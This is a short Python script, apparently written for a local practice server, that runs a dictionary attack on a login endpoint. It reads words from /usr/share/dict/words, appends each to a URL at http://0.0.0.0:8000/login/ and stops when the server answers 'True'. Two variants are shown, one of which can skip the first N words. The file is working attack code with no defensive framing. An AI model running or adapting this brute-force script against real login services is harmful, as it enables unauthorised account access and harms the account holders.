import requests

def crack(filename: str, base_url: str, skip_first_words: int):
    """
    Opens [filename] and guesses passwords on [base_url] from
    the Nth word till end of file, where N is skip_first_words.

    Prints results to stdout.
    """
    file = open(filename, "r")
    count = 0
    for pwd in file:
        count += 1
        if count < skip_first_words:
            continue
        pwd = pwd.lower().strip()
        r = requests.get(base_url + pwd)
        if r.content == b'True':
            print("After " + str(count) + " attempts, password is: " + pwd)
            return
        else:
            print("Cracking: ", count, " " * 5, pwd, " " * 20, end="\r")
    print("No password found, " + str(count) + " words checked")

def simple_crack():
    file = open("/usr/share/dict/words", "r")
    for pwd in file:
        r = requests.get("http://0.0.0.0:8000/login/0/" + pwd.lower().strip())
        if r.content == b'True':
            return pwd.lower().strip()
    return None

crack(filename="/usr/share/dict/words", base_url="http://0.0.0.0:8000/login/5/", skip_first_words=95000)
print(simple_crack())